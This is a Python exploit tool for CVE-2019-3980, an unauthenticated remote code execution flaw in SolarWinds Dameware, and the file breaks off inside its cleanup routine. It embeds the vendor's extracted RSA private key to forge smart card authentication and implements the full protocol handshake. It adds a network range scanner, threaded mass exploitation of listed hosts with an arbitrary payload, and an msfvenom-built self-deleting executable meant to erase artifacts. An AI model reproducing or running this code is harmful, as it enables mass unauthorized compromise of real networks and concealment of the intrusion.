#!/usr/bin/env python3
"""
DameFlare v1.0 - CVE-2019-3980 SolarWinds Dameware RCE
Full protocol implementation + network scanner + multi-target exploit
Original research: Tenable, Inc. (TRA-2019-43)
Python 3 implementation: David Boyd (@Fir3d0g)

AFFECTED : Dameware MRC 12.0.x (before HF1), 12.1.x (before HF3)
PATCHED  : Dameware 12.0.x HF1+, 12.1.x HF3+
"""

import sys
import socket
import os
import argparse
import binascii
import contextlib
import ipaddress
import concurrent.futures
from struct import pack, unpack, unpack_from
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA512
from Crypto.Protocol import KDF
from Crypto.Signature import pkcs1_15          # pycryptodome >= 3.9 — replaces PKCS1_v1_5
from Crypto.PublicKey import RSA

# ══════════════════════════════════════════════════════════════════════════════
# ANSI COLOR CODES
# ══════════════════════════════════════════════════════════════════════════════

RESET   = "\033[0m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
CYAN    = "\033[96m"
ORANGE  = "\033[38;5;208m"

# ══════════════════════════════════════════════════════════════════════════════
# BANNER
# ══════════════════════════════════════════════════════════════════════════════

_BANNER_ART = (
    "  (                                                   \n"
    r"   )\ )                      (     (                   " + "\n"
    r"  (()/(      )     )      (  )\ )  )\   )  (      (   " + "\n"
    r"   /(_))  ( /(    (      ))\(()/( ((_)( /(  )(    ))\  " + "\n"
    r"  (_))_   )(_))   )\  ' /((_)/(_)) _  )(_))(()\ /((_) " + "\n"
    r"   |   \ ((_)_  _((_)) (_)) (_) _|| |((_)_  ((_)(_))   " + "\n"
    "   | |) |/ _` || '  \\()/ -_) |  _|| |/ _` || '_|/ -_)  \n"
    r"   |___/ \__,_||_|_|_| \___| |_|  |_|\__,_||_|  \___|" + "\n"
)
BANNER = (
    ORANGE + BOLD + _BANNER_ART + RESET + "\n" +
    ORANGE +
    "  SolarWinds Dameware \u2014 Unauthenticated RCE via Smart Card Auth\n"
    "  CVE-2019-3980  |  CVSS 9.8 CRITICAL  |  TCP/6129\n" +
    RESET +
    "\n"
    "  Original research : Tenable, Inc. (TRA-2019-43)\n"
    "  Python 3 tool     : David Boyd (@Fir3d0g)  |  v1.0\n"
)

# ══════════════════════════════════════════════════════════════════════════════
# LOGGING HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def info(msg):
    print(f"{BLUE}[*]{RESET} {msg}")

def success(msg):
    print(f"{GREEN}[+]{RESET} {msg}")

def warn(msg):
    print(f"{YELLOW}[!]{RESET} {msg}")

def err(msg):
    """Print error without exiting — safe for use inside worker threads."""
    print(f"{RED}[-]{RESET} {msg}")

def fatal(msg):
    """Print error and exit — for main() only, never call from exploit()."""
    err(msg)
    sys.exit(1)

# ══════════════════════════════════════════════════════════════════════════════
# EXCEPTIONS
# ══════════════════════════════════════════════════════════════════════════════

class ExploitError(Exception):
    """Raised by exploit() on unrecoverable protocol errors."""
    pass

# ══════════════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ══════════════════════════════════════════════════════════════════════════════

def hex_dump(data, length=16):
    """Generate hex dump of binary data."""
    lines = []
    for i in range(0, len(data), length):
        chunk = data[i:i+length]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        if len(hex_part) > 24:
            hex_part = f"{hex_part[:24]} {hex_part[24:]}"
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        lines.append(f"{i:08x}:  {hex_part:<{length*3}}  {ascii_part}")
    return '\n'.join(lines)

def dump(title, data):
    """Print titled hex dump."""
    print(f"\n{DIM}--- [ {title} ] ---{RESET}")
    print(hex_dump(data))
    print()

def recvall(sock, n):
    """
    Receive exactly n bytes from socket.
    Uses a bytearray accumulator to avoid O(n^2) string concatenation.
    Returns bytes on success, raises ExploitError on connection drop.
    """
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ExploitError(f"Connection closed after {len(buf)}/{n} bytes")
        buf.extend(chunk)
    return bytes(buf)

def xrecv(sock):
    """
    Receive a variable-length Dameware message.
    Header is always 0xc bytes: [type:u32][unk:u32][payload_size:u32]
    Payload follows immediately if payload_size > 0.
    """
    header = recvall(sock, 0xc)
    msg_type, unk, size = unpack('<III', header)
    if size:
        payload = recvall(sock, size)
        return header + payload
    return header

def recv_until(sock, expected_type, label, max_skip=10, verbose=False):
    """
    Read messages until we get one with the expected type, skipping
    intermediate status/informational packets the server may inject.
    This handles cases where the server sends small status messages
    (e.g. 0xA410) before the actual response we need.

    A flood of 0x00000000 type messages indicates the server closed the
    connection — we treat 3 consecutive nulls as a fatal connection drop.
    Raises ExploitError if we exceed max_skip or detect connection close.
    """
    null_streak = 0
    for attempt in range(max_skip + 1):
        res = xrecv(sock)
        msg_type = unpack_from('<I', res)[0]
        if msg_type == expected_type:
            return res
        if msg_type == 0x00000000:
            null_streak += 1
            if null_streak >= 3:
                raise ExploitError(
                    f"Server closed connection (3 null messages) while waiting for {label}"
                )
        else:
            null_streak = 0
        warn(f"Skipping intermediate message 0x{msg_type:08X} ({len(res)} bytes) "
             f"(waiting for {label})")
        if verbose and len(res) > 0xc:
            dump(f"skipped 0x{msg_type:08X}", res)
        if attempt == max_skip:
            raise ExploitError(
                f"Expected {label} (0x{expected_type:08X}) after {max_skip} skips, "
                f"last got 0x{msg_type:08X}"
            )
    return None  # unreachable


def int2bin(i):
    """
    Convert a non-negative integer to big-endian bytes.
    Uses int.to_bytes() — cleaner and safer than hex string manipulation.
    """
    if i == 0:
        return b'\x00'
    length = (i.bit_length() + 7) // 8
    return i.to_bytes(length, 'big')

def aes_cbc_decrypt(data, key, iv):
    """AES-CBC decryption."""
    return AES.new(key, AES.MODE_CBC, iv).decrypt(data)

def expect(res, expected_type, label):
    """
    Check that a received message has the expected type field.
    Raises ExploitError on mismatch so the caller's finally block fires.
    """
    msg_type = unpack_from('<I', res)[0]
    if msg_type != expected_type:
        raise ExploitError(
            f"Expected {label} (0x{expected_type:08X}), got 0x{msg_type:08X}"
        )
    return msg_type

# ══════════════════════════════════════════════════════════════════════════════
# HARDCODED CRYPTO CONSTANTS
# ══════════════════════════════════════════════════════════════════════════════

# This is the RSA-1024 private key hardcoded inside the Dameware binary itself.
# The vendor ships the same key on every installation — this is the actual
# vulnerability. The attacker does not generate this key; we extracted it from
# the DWRCS.exe binary. Possession of this key allows us to forge the smart
# card authentication handshake.
RSA_KEY = (
    b"\x30\x82\x02\x5D\x02\x01\x00\x02\x81\x81\x00\xAD\x8C\x81\x7B\xC7"
    b"\x0B\xCA\xF7\x50\xBB\xD3\xA0\x7D\xC0\xA4\x31\xE3\xDD\x28\xCE\x99"
    b"\x78\x05\x92\x94\x41\x03\x85\xF5\xF0\x24\x77\x9B\xB1\xA6\x1B\xC7"
    b"\x9A\x79\x4D\x69\xAE\xCB\xC1\x5A\x88\xB6\x62\x9F\x93\xF5\x4B\xCA"
    b"\x86\x6C\x23\xAE\x4F\x43\xAC\x81\x7C\xD9\x81\x7E\x30\xB4\xCC\x78"
    b"\x6B\x77\xD0\xBB\x20\x1C\x35\xBE\x4D\x12\x44\x4A\x63\x14\xEC\xFC"
    b"\x9A\x86\xA2\x4F\x98\xB9\xB5\x49\x5F\x6C\x37\x08\xC0\x1D\xD6\x33"
    b"\x67\x97\x7C\x0D\x36\x62\x70\x25\xD8\xD4\xE8\x44\x61\x59\xE3\x61"
    b"\xCA\xB8\x9E\x14\x14\xAA\x2F\xCB\x89\x10\x1B\x02\x03\x01\x00\x01"
    b"\x02\x81\x81\x00\xA1\x60\xCF\x22\xD7\x33\x3B\x18\x00\x85\xB7\xC3"
    b"\x3C\x4C\x3F\x22\x79\x3D\xB4\xED\x70\x3D\xF0\x08\x9E\x3D\x5A\x56"
    b"\x5E\x1C\x60\xFC\xAB\xD5\x64\x9D\xDE\x5C\xE1\x41\x3F\xED\x9F\x60"
    b"\x7B\x9C\x36\xE4\xBC\x78\xEC\x16\xFF\x0B\x42\x51\x67\x8C\x23\x64"
    b"\xAC\xBF\xF8\xCB\xED\xE8\x46\x66\x40\x8F\x70\x46\x10\x9C\x63\x07"
    b"\x74\x33\x64\x26\x25\xA6\x34\x43\x8F\x95\xA9\x70\xD1\x40\x69\x0B"
    b"\xF8\xC8\x62\x5F\x8D\xE8\x8F\xC4\x46\xBF\x09\xAB\x83\x68\xFE\x5F"
    b"\x2D\x2D\x3B\xD9\xF5\xD5\x32\x34\xBC\x37\x17\xCB\x13\x50\x96\x6E"
    b"\x26\x82\xC2\x39\x02\x41\x00\xD9\x5D\x24\x6C\x3B\xA7\x85\x7F\xD9"
    b"\x6A\x7E\xDC\x4E\xDC\x67\x10\x1D\x6E\xAC\x19\xA9\xA3\xF7\xC0\x27"
    b"\x0A\xC3\x03\x94\xB5\x16\x54\xFC\x27\x3B\x41\xBC\x52\x80\x6B\x14"
    b"\x01\x1D\xAC\x9F\xC0\x04\xB9\x26\x01\x96\x68\xD8\xB9\x9A\xAD\xD8"
    b"\xA1\x96\x84\x93\xA2\xD8\xAF\x02\x41\x00\xCC\x65\x9E\xA8\x08\x7B"
    b"\xD7\x3D\x61\xD2\xB3\xCF\xC6\x4F\x0C\x65\x25\x1E\x68\xC6\xAC\x04"
    b"\xD0\xC4\x3A\xA7\x9E\xEB\xDE\xD9\x20\x9A\xCE\x92\x77\xB7\x84\xC0"
    b"\x1B\x42\xB4\xCA\xBE\xFC\x20\x88\x68\x2D\x0F\xC4\x6D\x44\x28\xA0"
    b"\x40\x0F\x88\x25\x08\x12\x51\x86\x42\x55\x02\x41\x00\xA4\x52\x0D"
    b"\x9E\xE4\xDA\x17\xCA\x37\x0A\x93\x2C\xE9\x51\x25\x78\xC1\x47\x51"
    b"\x43\x75\x43\x47\xA0\x33\xE3\xA6\xD9\xA6\x29\xDF\xE0\x0F\x5F\x79"
    b"\x24\x90\xC1\xAD\xE3\x45\x14\x32\xE2\xB5\x41\xEC\x50\x2B\xB3\x37"
    b"\x89\xBB\x8D\x54\xA9\xE8\x03\x00\x4E\xE9\x6D\x4A\x71\x02\x40\x4E"
    b"\x23\x73\x19\xCD\xD4\x7A\x1E\x6F\x2D\x3B\xAC\x6C\xA5\x7F\x99\x93"
    b"\x2D\x22\xE5\x00\x91\xFE\xB5\x65\xAE\xFA\xE4\x35\x17\x50\x8D\x9D"
    b"\xF7\x04\x69\x56\x08\x92\xE3\x57\x76\x42\xB8\xE4\x3F\x01\x84\x68"
    b"\x88\xB1\x34\xE3\x4B\x0F\xF2\x60\x1B\xB8\x10\x38\xB6\x58\xD9\x02"
    b"\x40\x65\xB1\xDE\x13\xAB\xAA\x01\x0D\x54\x53\x86\x85\x08\x5B\xC8"
    b"\xC0\x06\x7B\xBA\x51\xC6\x80\x0E\xA4\xD2\xF5\x63\x5B\x3C\x3F\xD1"
    b"\x30\x66\xA4\x2B\x60\x87\x9D\x04\x5F\x16\xEC\x51\x02\x9F\x53\xAA"
    b"\x22\xDF\xB4\x92\x01\x0E\x9B\xA6\x6C\x5E\x9D\x2F\xD8\x6B\x60\xD7"
    b"\x47"
)

RSA_PUBKEY = (
    b"\x30\x81\x89\x02\x81\x81\x00\xAD\x8C\x81\x7B\xC7\x0B\xCA\xF7\x50"
    b"\xBB\xD3\xA0\x7D\xC0\xA4\x31\xE3\xDD\x28\xCE\x99\x78\x05\x92\x94"
    b"\x41\x03\x85\xF5\xF0\x24\x77\x9B\xB1\xA6\x1B\xC7\x9A\x79\x4D\x69"
    b"\xAE\xCB\xC1\x5A\x88\xB6\x62\x9F\x93\xF5\x4B\xCA\x86\x6C\x23\xAE"
    b"\x4F\x43\xAC\x81\x7C\xD9\x81\x7E\x30\xB4\xCC\x78\x6B\x77\xD0\xBB"
    b"\x20\x1C\x35\xBE\x4D\x12\x44\x4A\x63\x14\xEC\xFC\x9A\x86\xA2\x4F"
    b"\x98\xB9\xB5\x49\x5F\x6C\x37\x08\xC0\x1D\xD6\x33\x67\x97\x7C\x0D"
    b"\x36\x62\x70\x25\xD8\xD4\xE8\x44\x61\x59\xE3\x61\xCA\xB8\x9E\x14"
    b"\x14\xAA\x2F\xCB\x89\x10\x1B\x02\x03\x01\x00\x01"
)

PBKDF2_SALT = b'\x54\x40\xf4\x91\xa6\x06\x25\xbc'
AES_IV      = b'\x54\x40\xF4\x91\xA6\x06\x25\xBC\x8E\x84\x56\xD6\xCB\xB7\x40\x59'

# NOTE: The DH prime below is only 128 bits — far below the modern minimum of
# 2048 bits. This is a protocol-level weakness in Dameware itself, not in this
# tool. A network-level attacker could perform a MITM against this exchange.
DH_PRIME     = 0xF51FFB3C6291865ECDA49C30712DB07B
DH_GENERATOR = 3

# Message type constants
MSG_TYPE_VERSION             = 0x00001130
MSG_CLIENT_INFORMATION_V7    = 0x00011171
MSG_TYPE_RSA_CRYPTO_C_INIT   = 0x000105b8
MSG_000105B9                 = 0x000105b9
MSG_REGISTRATION_INFORMATION = 0x0000b004
MSG_SOCKET_ADD               = 0x00010626
MSG_D6E2                     = 0x0000D6E2
MSG_SMARTCARD_COMMAND        = 0x0000D6F6

# ══════════════════════════════════════════════════════════════════════════════
# SCAN MODE
# ══════════════════════════════════════════════════════════════════════════════

SCAN_OPEN        = "OPEN"
SCAN_OPEN_NOCONF = "OPEN?"
SCAN_CLOSED      = "CLOSED"
SCAN_FILTERED    = "FILTERED"
SCAN_ERROR       = "ERROR"

def probe_host(host, port, timeout):
    """
    Probe a single host for the Dameware service.
    Returns (host, port, status, version_info).
    Socket is always cleaned up via contextlib.closing.
    """
    try:
        with contextlib.closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:
            s.settimeout(timeout)
            try:
                s.connect((host, port))
            except ConnectionRefusedError:
                return (host, port, SCAN_CLOSED, None)
            except socket.timeout:
                return (host, port, SCAN_FILTERED, None)
            except OSError as e:
                return (host, port, SCAN_ERROR, str(e))

            # Port is open — try to read the version banner
            try:
                banner = recvall(s, 0x28)
            except ExploitError:
                return (host, port, SCAN_OPEN_NOCONF, None)
            except Exception:
                return (host, port, SCAN_OPEN_NOCONF, None)

            if len(banner) < 4:
                return (host, port, SCAN_OPEN_NOCONF, None)

            msg_type = unpack_from('<I', banner)[0]
            if msg_type != MSG_TYPE_VERSION:
                return (host, port, SCAN_OPEN_NOCONF, None)

            # Try to pull a version string (UTF-16LE at offset 8)
            version_str = None
            try:
                version_str = banner[8:].decode('utf-16-le', errors='ignore').rstrip('\x00') or None
            except Exception:
                pass

            return (host, port, SCAN_OPEN, version_str)

    except Exception as e:
        return (host, port, SCAN_ERROR, str(e))


def expand_targets(target_spec):
    """
    Expand a target specification into a list of IP strings.
    Accepts single IP, CIDR, dash range (last-octet), or comma list.
    """
    hosts = []
    for part in target_spec.split(','):
        part = part.strip()
        if not part:
            continue
        if '/' in part:
            try:
                net = ipaddress.ip_network(part, strict=False)
                hosts.extend(str(ip) for ip in net.hosts())
            except ValueError as e:
                fatal(f"Invalid CIDR range '{part}': {e}")
        elif '-' in part:
            try:
                base, end = part.rsplit('-', 1)
                base_parts = base.split('.')
                if len(base_parts) != 4:
                    raise ValueError("Expected dotted-quad base address")
                prefix    = '.'.join(base_parts[:3])
                start_oct = int(base_parts[3])
                end_oct   = int(end)
                for i in range(start_oct, end_oct + 1):
                    hosts.append(f"{prefix}.{i}")
            except (ValueError, IndexError) as e:
                fatal(f"Invalid dash range '{part}': {e}")
        else:
            try:
                ipaddress.ip_address(part)
                hosts.append(part)
            except ValueError:
                try:
                    hosts.append(socket.gethostbyname(part))
                except socket.gaierror:
                    fatal(f"Cannot resolve host: '{part}'")
    return hosts


def run_scan(target_spec, port, timeout, threads, output_file=None, hosts=None):
    """
    Scan one or more targets for the Dameware service.
    Pass target_spec (CIDR/range/IP) OR a pre-expanded hosts list, not both.
    """
    if hosts is None:
        hosts = expand_targets(target_spec)
    total = len(hosts)
    if total == 0:
        fatal("No valid targets to scan.")

    info(f"Scanning {total} host(s) on port {port}/tcp  (threads={threads}, timeout={timeout}s)")
    print()
    print(f"  {BOLD}{'HOST':<18} {'PORT':<8} {'STATUS':<10} {'SERVICE / VERSION'}{RESET}")
    print(f"  {'─'*18} {'─'*8} {'─'*10} {'─'*30}")

    vulnerable  = []
    open_noconf = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(probe_host, h, port, timeout): h for h in hosts}
        for future in concurrent.futures.as_completed(futures):
            host, p, status, version = future.result()

            if status == SCAN_OPEN:
                color       = GREEN
                ver_display = f"Dameware DWRCS  {version or ''}"
                vulnerable.append(host)
            elif status == SCAN_OPEN_NOCONF:
                color       = YELLOW
                ver_display = "Open (service unconfirmed)"
                open_noconf.append(host)
            elif status == SCAN_FILTERED:
                color       = DIM
                ver_display = "Filtered"
            elif status == SCAN_CLOSED:
                color       = DIM
                ver_display = "Closed"
            else:
                color       = RED
                ver_display = f"Error: {version}"

            if status in (SCAN_OPEN, SCAN_OPEN_NOCONF) or total == 1:
                print(f"  {color}{host:<18} {p:<8} {status:<10} {ver_display}{RESET}")

    print()
    print(f"  {BOLD}Scan complete.{RESET}  "
          f"{GREEN}{len(vulnerable)} confirmed potentially vulnerable{RESET}  |  "
          f"{YELLOW}{len(open_noconf)} open/unconfirmed{RESET}  |  "
          f"{total} total hosts scanned")

    if vulnerable:
        print()
        success("Confirmed potentially vulnerable hosts:")
        for h in vulnerable:
            print(f"    {GREEN}{h}:{port}{RESET}")

    if output_file and vulnerable:
        try:
            with open(output_file, 'w') as f:
                for h in vulnerable:
                    f.write(f"{h}\n")
            success(f"Vulnerable host list saved to: {output_file}")
        except Exception as e:
            warn(f"Could not write output file: {e}")

    return vulnerable

# ══════════════════════════════════════════════════════════════════════════════
# MULTI-TARGET EXPLOIT
# ══════════════════════════════════════════════════════════════════════════════

def load_targets_file(path):
    """
    Read a targets file — one IP per line, blank lines and # comments ignored.
    Compatible with the -o/--output format produced by scan mode.
    """
    hosts = []
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                hosts.append(line)
    except Exception as e:
        fatal(f"Cannot read targets file '{path}': {e}")
    return hosts


def exploit_worker(host, port, payload_path, timeout, verbose, auth_type=3):
    """
    Thread worker — runs exploit() against one host.
    Returns (host, bool). Never calls sys.exit() — exploit() raises
    ExploitError on failure instead, which we catch cleanly here.
    """
    try:
        result = exploit(host, port, payload_path, timeout, verbose, auth_type)
        return (host, result)
    except ExploitError as e:
        err(f"[{host}] {e}")
        return (host, False)
    except Exception as e:
        err(f"[{host}] Unhandled exception: {e}")
        return (host, False)


def run_multi_exploit(hosts, port, payload_path, timeout, threads, verbose, auth_type=3):
    """Run the exploit against a list of hosts, sequentially or concurrently."""
    total = len(hosts)
    info(f"Multi-target exploit: {total} host(s)  |  port {port}  |  threads {threads}")
    info(f"Payload: {payload_path}  ({os.path.getsize(payload_path):,} bytes)")
    print()

    succeeded = []
    failed    = []

    if threads == 1:
        for host in hosts:
            h, result = exploit_worker(host, port, payload_path, timeout, verbose, auth_type)
            (succeeded if result else failed).append(h)
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
            futures = {
                pool.submit(exploit_worker, h, port, payload_path, timeout, verbose, auth_type): h
                for h in hosts
            }
            for future in concurrent.futures.as_completed(futures):
                h, result = future.result()
                (succeeded if result else failed).append(h)

    print()
    print(f"  {'─'*60}")
    print(f"  {BOLD}MULTI-TARGET RESULTS{RESET}")
    print(f"  {'─'*60}")
    for h in succeeded:
        print(f"  {GREEN}[+] {h:<20} SUCCESS{RESET}")
    for h in failed:
        print(f"  {RED}[-] {h:<20} FAILED / PARTIAL{RESET}")
    print(f"  {'─'*60}")
    print(f"  {BOLD}Total: {total}  |  "
          f"{GREEN}Succeeded: {len(succeeded)}{RESET}{BOLD}  |  "
          f"{RED}Failed: {len(failed)}{RESET}")
    print()

    return succeeded, failed


# ══════════════════════════════════════════════════════════════════════════════
# HANDSHAKE (shared by exploit and cleanup)
# ══════════════════════════════════════════════════════════════════════════════

def _do_handshake(s, target, verbose=False, auth_type=3):
    """
    Execute steps 1-10 of the CVE-2019-3980 protocol handshake on an already-
    connected socket.  Returns nothing — raises ExploitError on any failure.
    The socket is ready for payload delivery (step 11) when this returns.
    """

    # ── STEP 1: MSG_TYPE_VERSION ──────────────────────────────────────────────
    info("Waiting for MSG_TYPE_VERSION ...")
    res = recvall(s, 0x28)
    expect(res, MSG_TYPE_VERSION, "MSG_TYPE_VERSION")
    success("Got MSG_TYPE_VERSION")
    if verbose: dump("server MSG_TYPE_VERSION", res)

    srv_auth = unpack_from('<I', res, 36)[0]
    srv_ver1 = unpack_from('<d', res, 8)[0]
    srv_ver2 = unpack_from('<d', res, 16)[0]

    if auth_type == -1:
        req = bytes(res)
        info(f"Server advertised auth flags: 0x{srv_auth:02X} — sending pure echo")
    else:
        req = pack('<IIddIIII', MSG_TYPE_VERSION, 0, 12.0, 0.0, 4, 0, 0, auth_type)
        info(f"Server advertised auth flags: 0x{srv_auth:02X} — sending smart card request (auth={auth_type})")
    s.sendall(req)

    # ── STEP 2: MSG_CLIENT_INFORMATION_V7 ────────────────────────────────────
    info("Waiting for MSG_CLIENT_INFORMATION_V7 ...")
    res = recvall(s, 0x3af8)
    peek_type = unpack_from('<I', res)[0]
    if peek_type == 0x0000A410:
        if verbose: dump("server 0xA410 (rejection)", res)
        raise ExploitError(
            f"Server rejected auth request with 0xA410. "
            f"Server auth flags: 0x{srv_auth:02X}. "
            f"Try running with --auth-type to specify a different value."
        )
    expect(res, MSG_CLIENT_INFORMATION_V7, "MSG_CLIENT_INFORMATION_V7")
    success("Got MSG_CLIENT_INFORMATION_V7")
    if verbose: dump("server MSG_CLIENT_INFORMATION_V7", res)

    datetime_str = ''
    i = 8
    while i < len(res) and res[i] != 0:
        datetime_str += chr(res[i])
        i += 2
    info(f"Extracted datetime: {datetime_str}")

    prf = lambda p, s_: HMAC.new(p, s_, SHA512).digest()
    key = KDF.PBKDF2(datetime_str.encode(), PBKDF2_SALT, 16, 1000, prf)
    if verbose: dump("Derived AES key", key)

    info("Sending MSG_CLIENT_INFORMATION_V7 (echo) ...")
    s.sendall(res)

    # ── STEP 3: MSG_TYPE_RSA_CRYPTO_C_INIT ───────────────────────────────────
    info("Waiting for MSG_TYPE_RSA_CRYPTO_C_INIT ...")
    res = recvall(s, 0x1220)
    msg_type, enc_len = unpack_from('<II', res)
    if msg_type != MSG_TYPE_RSA_CRYPTO_C_INIT:
        raise ExploitError(
            f"Expected MSG_TYPE_RSA_CRYPTO_C_INIT (0x{MSG_TYPE_RSA_CRYPTO_C_INIT:08X}), "
            f"got 0x{msg_type:08X}"
        )
    success("Got MSG_TYPE_RSA_CRYPTO_C_INIT")

    crypt  = res[0x100c:0x100c + enc_len]
    params = aes_cbc_decrypt(crypt, key, AES_IV)
    if verbose:
        dump("Encrypted MSG_TYPE_RSA_CRYPTO_C_INIT params", crypt)
        dump("Decrypted MSG_TYPE_RSA_CRYPTO_C_INIT params", params)

    info("Sending MSG_TYPE_RSA_CRYPTO_C_INIT (echo) ...")
    s.sendall(res)

    # ── STEP 4: MSG_000105B9 DH Round 1 ──────────────────────────────────────
    info("Waiting for MSG_000105B9 (DH round 1) ...")
    res = recvall(s, 0x2c2c)
    if unpack_from('<I', res)[0] != MSG_000105B9:
        raise ExploitError("Expected MSG_000105B9 (DH round 1)")
    success("Got MSG_000105B9 (DH round 1)")
    if verbose: dump("server MSG_000105B9 (1)", res)

    pubkey_len       = unpack_from('<I', res, 0x140c)[0]
    srv_pubkey_bytes = res[0x100c:0x100c + pubkey_len]
    srv_pubkey       = int.from_bytes(srv_pubkey_bytes, 'big')
    if verbose: dump("server DH public key", srv_pubkey_bytes)

    clt_privkey      = int.from_bytes(os.urandom(16), 'big')
    clt_pubkey_bytes = int2bin(pow(DH_GENERATOR, clt_privkey, DH_PRIME))
    shared_secret    = int2bin(pow(srv_pubkey, clt_privkey, DH_PRIME))
    clt_sum          = sum(shared_secret)

    if verbose:
        dump("client DH public key", clt_pubkey_bytes)
        dump("DH shared secret",     shared_secret)

    buf = bytearray(res)
    buf[0x1418:0x1418 + len(clt_pubkey_bytes)] = clt_pubkey_bytes
    buf[0x1818:0x1818 + 4] = pack('<I', len(clt_pubkey_bytes))

    info("Sending MSG_000105B9 (DH round 1) with client public key ...")
    s.sendall(bytes(buf))

    # ── STEP 5: MSG_000105B9 DH Round 2 ──────────────────────────────────────
    info("Waiting for MSG_000105B9 (DH round 2) ...")
    res = recvall(s, 0x2c2c)
    if unpack_from('<I', res)[0] != MSG_000105B9:
        raise ExploitError("Expected MSG_000105B9 (DH round 2)")
    success("Got MSG_000105B9 (DH round 2)")
    if verbose: dump("server MSG_000105B9 (2)", res)

    srv_sum = unpack_from('<I', res, 0x1820)[0]
    info(f"Client DH shared secret byte-sum: 0x{clt_sum:x}")
    info(f"Server DH shared secret byte-sum: 0x{srv_sum:x}")
    if clt_sum != srv_sum:
        warn("DH shared secret sum mismatch — continuing anyway ...")
    else:
        success("DH shared secret verified!")

    rsa_privkey = RSA.import_key(RSA_KEY)
    hash_obj    = SHA512.new(shared_secret)
    rsa_sig     = pkcs1_15.new(rsa_privkey).sign(hash_obj)
    if verbose: dump("RSA signature of DH shared secret", rsa_sig)

    buf = bytearray(res)
    buf[0x1410:0x1410 + 4]               = pack('<I', len(shared_secret))
    buf[0x1414:0x1414 + 4]               = pack('<I', clt_sum)
    buf[0x1824:0x1824 + len(rsa_sig)]    = rsa_sig
    buf[0x2024:0x2024 + 4]               = pack('<I', len(rsa_sig))
    buf[0x2028:0x2028 + len(RSA_PUBKEY)] = RSA_PUBKEY
    buf[0x2828:0x2828 + 4]               = pack('<I', len(RSA_PUBKEY))

    info("Sending MSG_000105B9 (DH round 2) with RSA signature ...")
    s.sendall(bytes(buf))

    # ── STEP 6: MSG_REGISTRATION_INFORMATION ─────────────────────────────────
    info("Waiting for MSG_REGISTRATION_INFORMATION ...")
    res = recvall(s, 0xc50)
    if unpack_from('<I', res)[0] != MSG_REGISTRATION_INFORMATION:
        raise ExploitError("Expected MSG_REGISTRATION_INFORMATION")
    success("Got MSG_REGISTRATION_INFORMATION")
    if verbose: dump("server MSG_REGISTRATION_INFORMATION", res)

    info("Sending MSG_REGISTRATION_INFORMATION (echo) ...")
    s.sendall(res)

    # ── STEP 7: MSG_SOCKET_ADD ────────────────────────────────────────────────
    info("Waiting for MSG_SOCKET_ADD ...")
    res = recvall(s, 0x224)
    if unpack_from('<I', res)[0] != MSG_SOCKET_ADD:
        raise ExploitError("Expected MSG_SOCKET_ADD")
    success("Got MSG_SOCKET_ADD")
    if verbose: dump("server MSG_SOCKET_ADD", res)

    # ── STEP 8: MSG_D6E2 ─────────────────────────────────────────────────────
    info("Waiting for MSG_D6E2 ...")
    res = recvall(s, 0x1438)
    if unpack_from('<I', res)[0] != MSG_D6E2:
        raise ExploitError("Expected MSG_D6E2")
    success("Got MSG_D6E2")
    if verbose: dump("server MSG_D6E2", res)

    info("Sending MSG_D6E2 (echo) ...")
    s.sendall(res)

    # ── STEPS 9 & 10: MSG_SMARTCARD_COMMAND (empty x2) ───────────────────────
    for i in (1, 2):
        info(f"Waiting for MSG_SMARTCARD_COMMAND ({i}) ...")
        res = xrecv(s)
        if unpack_from('<I', res)[0] != MSG_SMARTCARD_COMMAND:
            raise ExploitError(f"Expected MSG_SMARTCARD_COMMAND ({i})")
        success(f"Got MSG_SMARTCARD_COMMAND ({i})")
        if verbose: dump(f"server MSG_SMARTCARD_COMMAND ({i})", res)


# ══════════════════════════════════════════════════════════════════════════════
# CLEANUP
# ══════════════════════════════════════════════════════════════════════════════


def cleanup(target, port, timeout=10, verbose=False, auth_type=3):
    """
    Connect to target and upload a self-deleting cleanup payload that removes
    C:\\Windows\\Temp\\dwDrvInst.exe from the target.

    Uses the identical CVE-2019-3980 handshake as exploit() — only the
    payload delivery step differs.  The existing exploit() function is
    completely unchanged.
    """
    info(f"Connecting to {target}:{port} ...")

    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_sock.settimeout(timeout)

    with contextlib.closing(raw_sock) as s:
        try:
            s.connect((target, port))
        except Exception as e:
            raise ExploitError(f"Connection failed: {e}")

        success(f"Connected to {target}:{port}")

        _do_handshake(s, target, verbose=verbose, auth_type=auth_type)

        # ── CLEANUP PAYLOAD DELIVERY ──────────────────────────────────────────
        # Dameware executes the uploaded file via CreateProcess — a real PE is
        # required.  We use msfvenom windows/x64/exec to build a tiny EXE that
        # runs a cmd.exe self-delete one-liner:
        #   cmd /c ping -n 2 127.0.0.1 & del /f /q <path>
        # The ping adds a ~2 second delay so the process exits before del fires.
        # This removes dwDrvInst.exe AND the cleanup EXE itself — zero artifacts.

        import subprocess as _sp, tempfile as _tmp, os as _os

        # cmd one-liner: wait 2s (ping) then delete the EXE at its own path
        cmd_str = (
            'cmd.exe /c ping -n 2 127.0.0.1 > nul & '
            'del /f /q C:\\Windows\\Temp\\dwDrvInst.exe'
        )

        info("Building cleanup EXE via msfvenom ...")
        tmp_exe = _tmp.mktemp(suffix='.exe')
        try:
            result = _sp.run(
                ['msfvenom', '-p', 'windows/x64/exec',
                 f'CMD={cmd_str}',
                 '-f', 'exe', '-o', tmp_exe],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode != 0:
                raise ExploitError(f"msfvenom failed: {result.stderr.strip()}")
            with open(tmp_exe, 'rb') as f:
                cleanup_exe = f.read()
        except FileNotFoundError:
            raise ExploitError("msfvenom not found -- install metasploit-framework to use --cleanup")
        finally:
            if _os.path.exists(tmp_exe):
